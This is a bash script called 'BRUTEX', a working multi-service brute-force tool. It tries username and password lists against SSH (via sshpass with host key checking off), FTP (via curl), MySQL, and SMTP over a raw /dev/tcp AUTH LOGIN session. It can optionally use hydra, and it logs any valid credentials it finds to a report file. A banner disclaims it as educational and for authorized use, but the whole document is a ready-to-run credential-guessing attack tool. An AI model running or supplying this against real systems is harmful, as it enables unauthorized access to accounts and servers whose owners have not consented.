#!/usr/bin/env bash

RED='\033[1;31m'
GREEN='\033[1;32m'
CYAN='\033[1;36m'
YELLOW='\033[1;33m'
RESET='\033[0m'

REPORT="brutex_report_$(date +%Y%m%d_%H%M%S).txt"
HYDRA_AVAILABLE=0

show_disclaimer() {
    echo -e "${RED}"
    echo "╔══════════════════════════════════════════════════════════╗"
    echo "║                     DISCLAIMER                          ║"
    echo "╠══════════════════════════════════════════════════════════╣"
    echo "║ Use at your own risk, developer(s) assume NO liability  ║"
    echo "║ This tool is for educational & authorized testing ONLY  ║"
    echo "║ Unauthorized scanning of systems you don't own is       ║"
    echo "║ ILLEGAL. You have been warned.                          ║"
    echo "╚══════════════════════════════════════════════════════════╝"
    echo -e "${RESET}"
}

show_banner() {
    echo -e "${RED}"
    echo "  ╔══════════════════════════════════════╗"
    echo "  ║         BRUTEX v1.0                  ║"
    echo "  ║   Multi-Service Brute-Forcer         ║"
    echo "  ╚══════════════════════════════════════╝"
    echo -e "${RESET}"
}

show_help() {
    echo -e "${CYAN}Usage:${RESET}"
    echo "  $0 [option] [target] [port] [userlist] [passlist]"
    echo ""
    echo -e "${YELLOW}Options:${RESET}"
    echo "  --ssh     <target> <port> <users> <passs>   SSH brute"
    echo "  --ftp     <target> <port> <users> <passs>   FTP brute"
    echo "  --mysql   <target> <port> <users> <passs>   MySQL brute"
    echo "  --smtp    <target> <port> <users> <passs>   SMTP brute"
    echo "  -h, --help                                  Show this help"
    echo ""
    echo -e "${CYAN}Examples:${RESET}"
    echo "  $0 --ssh 192.168.1.1 22 users.txt passs.txt"
    echo "  $0 --ftp 10.0.0.5 21 users.txt passs.txt"
    echo "  $0                                    Interactive menu"
    echo -e "${RESET}"
}

check_hydra() {
    if command -v hydra &>/dev/null; then
        HYDRA_AVAILABLE=1
        echo -e "${GREEN}[+] hydra detected! Faster brute-force available.${RESET}"
    else
        HYDRA_AVAILABLE=0
        echo -e "${YELLOW}[!] hydra not found. Using manual fallback (slower).${RESET}"
    fi
}

check_deps() {
    for cmd in curl wget; do
        if ! command -v "$cmd" &>/dev/null; then
            echo -e "${YELLOW}[!] $cmd not found. Some features may be limited.${RESET}"
        fi
    done
}

check_port() {
    local host="$1" port="$2"
    timeout 3 bash -c "echo >/dev/tcp/$host/$port" 2>/dev/null && return 0 || return 1
}

brute_manual() {
    local service="$1" host="$2" port="$3" userlist="$4" passlist="$5"
    local found=0

    if [ ! -f "$userlist" ]; then
        echo -e "${RED}[!] Userlist not found: $userlist${RESET}"
        return 1
    fi
    if [ ! -f "$passlist" ]; then
        echo -e "${RED}[!] Passlist not found: $passlist${RESET}"
        return 1
    fi

    echo -e "${YELLOW}[*] Manual brute-force on $service://$host:$port${RESET}"
    echo "[BruteForce] $service://$host:$port" >> "$REPORT"

    while IFS= read -r user; do
        [ -z "$user" ] && continue
        while IFS= read -r pass; do
            [ -z "$pass" ] && continue
            echo -ne "${CYAN}[*] Trying: $user : $pass${RESET}\r"

            case "$service" in
                ssh)
                    timeout 5 sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$user@$host" -p "$port" exit 2>/dev/null
                    if [ $? -eq 0 ]; then
                        echo -e "${GREEN}[+] VALID: $user : $pass (SSH)${RESET}"
                        echo "[SUCCESS] SSH $host:$port - $user:$pass" >> "$REPORT"
                        found=1
                    fi
                    ;;
                ftp)
                    timeout 5 curl -s --user "$user:$pass" "ftp://$host:$port/" >/dev/null 2>&1
                    if [ $? -eq 0 ]; then
                        echo -e "${GREEN}[+] VALID: $user : $pass (FTP)${RESET}"
                        echo "[SUCCESS] FTP $host:$port - $user:$pass" >> "$REPORT"
                        found=1
                    fi
                    ;;
                mysql)
                    timeout 5 mysql -h "$host" -P "$port" -u "$user" -p"$pass" -e "SELECT 1" 2>/dev/null
                    if [ $? -eq 0 ]; then
                        echo -e "${GREEN}[+] VALID: $user : $pass (MySQL)${RESET}"
                        echo "[SUCCESS] MySQL $host:$port - $user:$pass" >> "$REPORT"
                        found=1
                    fi
                    ;;
                smtp)
                    timeout 5 bash -c "exec 3<>/dev/tcp/$host/$port; echo -e 'AUTH LOGIN\r' >&3; read -t 3 line <&3; echo -e '$(echo -n "$user" | base64)\r' >&3; read -t 3 line <&3; echo -e '$(echo -n "$pass" | base64)\r' >&3; read -t 3 line <&3; echo \"\$line\"" 2>/dev/null | grep -qi "authenticated\|success\|235"
                    if [ $? -eq 0 ]; then
                        echo -e "${GREEN}[+] VALID: $user : $pass (SMTP)${RESET}"
                        echo "[SUCCESS] SMTP $host:$port - $user:$pass" >> "$REPORT"
                        found=1
                    fi
                    ;;
            esac
        done < "$passlist"
    done < "$userlist"

    if [ "$found" -eq 0 ]; then
        echo -e "${YELLOW}[-] No valid credentials found for $service.${RESET}"
        echo "[RESULT] No valid credentials found for $service://$host:$port" >> "$REPORT"
    fi
}

brute_hydra() {
    local service="$1" host="$2" port="$3" userlist="$4" passlist="$5"

    echo -e "${GREEN}[*] Using hydra for $service://$host:$port${RESET}"
    echo "[BruteForce (hydra)] $service://$host:$port" >> "$REPORT"

    case "$service" in
        ssh)   hydra -L "$userlist" -P "$passlist" -o /tmp/hydra_result.txt "ssh://$host:$port" ;;
        ftp)   hydra -L "$userlist" -P "$passlist" -o /tmp/hydra_result.txt "ftp://$host:$port" ;;
        mysql) hydra -L "$userlist" -P "$passlist" -o /tmp/hydra_result.txt "mysql://$host:$port" ;;
        smtp)  hydra -L "$userlist" -P "$passlist" -o /tmp/hydra_result.txt "smtp://$host:$port" ;;
    esac

    if [ -f /tmp/hydra_result.txt ]; then
        cat /tmp/hydra_result.txt >> "$REPORT"
        grep -qi "success\|valid\|login:" /tmp/hydra_result.txt && \
            echo -e "${GREEN}[+] Credentials found! Check report.${RESET}" || \
            echo -e "${YELLOW}[-] No valid credentials found.${RESET}"
        rm -f /tmp/hydra_result.txt
    fi
}

run_brute() {
    local service="$1" host="$2" port="$3" userlist="$4" passlist="$5"

    echo -e "${CYAN}[*] Checking connectivity to $host:$port...${RESET}"
    if ! check_port "$host" "$port"; then
        echo -e "${RED}[!] Cannot reach $host:$port. Is the service running?${RESET}"
        return 1
    fi
    echo -e "${GREEN}[+] Host reachable on port $port.${RESET}"

    if [ "$HYDRA_AVAILABLE" -eq 1 ]; then
        if [ -t 0 ]; then
            echo -ne "${YELLOW}[?] Use hydra? (faster) [Y/n]: ${RESET}"
            read -r use_hydra
            case "$use_hydra" in
                n|N|no|NO) brute_manual "$service" "$host" "$port" "$userlist" "$passlist" ;;
                *)         brute_hydra "$service" "$host" "$port" "$userlist" "$passlist" ;;
            esac
        else
            brute_hydra "$service" "$host" "$port" "$userlist" "$passlist"
        fi
    else
        brute_manual "$service" "$host" "$port" "$userlist" "$passlist" || true
    fi
}

get_brute_args() {
    echo -ne "${YELLOW}[?] Target IP/Host: ${RESET}"
    read -r host
    echo -ne "${YELLOW}[?] Port: ${RESET}"
    read -r port
    echo -ne "${YELLOW}[?] Userlist file path: ${RESET}"
    read -r userlist
    echo -ne "${YELLOW}[?] Passlist file path: ${RESET}"
    read -r passlist
}

interactive_menu() {
    while true; do
        echo ""
        echo -e "${CYAN}╔══════════════════════════════════════╗${RESET}"
        echo -e "${CYAN}║            BRUTEX MENU               ║${RESET}"
        echo -e "${CYAN}╠══════════════════════════════════════╣${RESET}"
        echo -e "${CYAN}║${RESET}  1) SSH brute                    ${CYAN}║${RESET}"
        echo -e "${CYAN}║${RESET}  2) FTP brute                    ${CYAN}║${RESET}"
        echo -e "${CYAN}║${RESET}  3) MySQL brute                  ${CYAN}║${RESET}"
        echo -e "${CYAN}║${RESET}  4) SMTP brute                   ${CYAN}║${RESET}"
        echo -e "${CYAN}║${RESET}  5) Help                         ${CYAN}║${RESET}"
        echo -e "${CYAN}║${RESET}  6) Exit                         ${CYAN}║${RESET}"
        echo -e "${CYAN}╚══════════════════════════════════════╝${RESET}"
        echo -ne "${GREEN}[?] Select option: ${RESET}"
        read -r choice

        case "$choice" in
            1) get_brute_args; run_brute "ssh" "$host" "$port" "$userlist" "$passlist"
               echo -e "${GREEN}[+] Report saved to: $REPORT${RESET}" ;;
            2) get_brute_args; run_brute "ftp" "$host" "$port" "$userlist" "$passlist"
               echo -e "${GREEN}[+] Report saved to: $REPORT${RESET}" ;;
            3) get_brute_args; run_brute "mysql" "$host" "$port" "$userlist" "$passlist"
               echo -e "${GREEN}[+] Report saved to: $REPORT${RESET}" ;;
            4) get_brute_args; run_brute "smtp" "$host" "$port" "$userlist" "$passlist"
               echo -e "${GREEN}[+] Report saved to: $REPORT${RESET}" ;;
            5) show_help ;;
            6) echo -e "${GREEN}[+] Exiting. Stay ethical.${RESET}"; exit 0 ;;
            *) echo -e "${RED}[!] Invalid option.${RESET}" ;;
        esac
    done
}

main() {
    show_disclaimer
    show_banner
    check_deps
    check_hydra

    if [ $# -eq 0 ]; then
        interactive_menu
    else
        local mode="$1"; shift
        case "$mode" in
            --ssh|--ftp|--mysql|--smtp)
                local svc="${mode#--}"
                [ $# -lt 4 ] && { echo -e "${RED}[!] Missing arguments.${RESET}"; show_help; exit 1; }
                run_brute "$svc" "$1" "$2" "$3" "$4"
                echo -e "${GREEN}[+] Report saved to: $REPORT${RESET}"
                ;;
            -h|--help) show_help ;;
            *) echo -e "${RED}[!] Unknown option: $mode${RESET}"; show_help; exit 1 ;;
        esac
    fi
}

main "$@"
